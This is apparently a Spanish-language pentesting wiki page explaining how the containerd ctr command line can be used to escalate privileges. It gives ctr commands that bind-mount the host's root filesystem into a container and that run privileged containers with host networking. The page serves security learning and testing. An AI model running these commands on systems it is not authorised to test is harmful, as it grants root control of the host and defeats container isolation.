# Escalada de privilegios de Containerd (ctr)

{{#include ../../banners/hacktricks-training.md}}

## Información básica

Visita el siguiente enlace para aprender **dónde encajan `containerd` y `ctr` en el stack de contenedores**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Si encuentras que un host contiene el comando `ctr`, la CLI nativa incluida con containerd:<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
Puedes listar las imágenes conocidas por containerd:<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Luego **ejecuta una de esas imágenes con la raíz del host montada mediante bind recursivo en la raíz del contenedor**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Ejecuta un container en modo privileged y comprueba si es posible escapar.\
Puedes ejecutar un container usando la red del host como:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` otorga al proceso las capacidades efectivas de Linux del invocador y elimina varios controles de aislamiento, pero el escape sigue dependiendo del entorno; utiliza las técnicas mencionadas en la siguiente página para comprobarlo:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [Primeros pasos con containerd](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [Implementación del comando `ctr image`](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [Implementación del comando `ctr run`](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Documentación del kernel de Linux sobre shared-subtree](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [Paquete OCI de containerd: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [Flags del comando `ctr` de containerd](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
